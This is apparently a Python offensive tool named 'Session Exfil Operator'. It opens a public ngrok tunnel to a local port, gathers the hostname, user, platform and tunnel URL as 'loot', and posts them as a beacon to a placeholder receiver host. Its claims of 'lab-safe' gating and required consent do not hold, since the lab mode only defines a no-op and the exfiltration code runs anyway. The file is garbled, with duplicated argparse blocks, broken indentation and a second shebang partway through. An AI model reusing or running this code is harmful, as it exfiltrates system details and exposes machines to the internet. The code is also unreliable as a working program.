
from datetime import datetime

LOG_PATH = os.path.expanduser("~/exfil/.logs/exfil.log")

def log_event(event):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_PATH, "a") as log:
        log.write(f"[{timestamp}] {event}\n")

"""
__toolname__ = "Session Exfil Operator"
__author__ = "BlackOpsArchitect"
__intended_use__ = "Red team simulation / adversarial lab training only"
__lab_safe__ = True
__version__ = "1.0.10"
__kill_switch__ = "ENV:KILL=1"
__consent_required__ = True
__notes__ = "Stealth-grade tool with modular execution, full encryption, and lab-mode gating"
"""



import argparse
parser = argparse.ArgumentParser()
    parser.add_argument("--field", action="store_true", help="Field mode (exfil+persistence)")
parser.add_argument("--lab", action="store_true")


parser.add_argument("--consent", action="store_true")

parser.add_argument("--kill", action="store_true")
parser.add_argument("--lab", action="store_true", help="Lab mode (safe testing)")
parser.add_argument("--consent", action="store_true", help="Acknowledge and proceed")
parser.add_argument("--kill", action="store_true", help="Trigger kill switch")
args = parser.parse_args()
import argparse

parser = argparse.ArgumentParser(description="Session Exfil Operator Suite")
parser.add_argument("--lab", action="store_true", help="Run in lab-safe mode (no persistence, no outbound exfil)")
parser.add_argument("--consent", action="store_true", help="Acknowledge ethical usage terms")
parser.add_argument("--kill", action="store_true", help="Trigger immediate kill-switch")

args = parser.parse_args()

if not args.consent:
    print("[!] Consent flag required to proceed with execution.")
    exit(0)

if args.kill or os.getenv("KILL") == "1":
    print("[x] Kill switch triggered. Exiting.")
    exit(0)

if args.lab:
    print("[*] Lab mode activated. Exfiltration and persistence modules disabled.")
    # Stub any real payload execution here (example)
    def noop(): pass

#!/usr/bin/env python3
import os
import requests
import time
import json

print("[*] NGROK EXFIL AUTOPILOT ENGAGED")

# Step 1: Kill existing ngrok to clean up session
os.system("pkill ngrok")

# Step 2: Launch ngrok tunnel in background (port 8000 default)
os.system("nohup ngrok http 8000 > /dev/null 2>&1 &")
print("[+] Spinning up Ngrok tunnel...")

# Step 3: Wait for tunnel to initialize
time.sleep(4)

# Step 4: Get public Ngrok URL
try:
    r = requests.get("http://127.0.0.1:4040/api/tunnels")
    tunnels = r.json()["tunnels"]
    public_url = tunnels[0]["public_url"]
    print(f"[+] Tunnel established: {public_url}")
except Exception as e:
    print(f"[!] Failed to fetch tunnel URL: {e}")
    public_url = "N/A"

# Step 5: Gather system data
import socket
import platform

loot = {
    "host": socket.gethostname(),
    "user": os.getenv("USER"),
    "platform": platform.platform(),
    "ngrok": public_url,
    "time": time.ctime()
}

# Step 6: Send beacon/exfil
try:
    response = requests.post("https://your-ngrok-receiver.io/post", json=loot)
    print(f"[+] Beacon sent. Status: {response.status_code}")
except Exception as ex:
    print(f"[!] Failed to send beacon: {ex}")
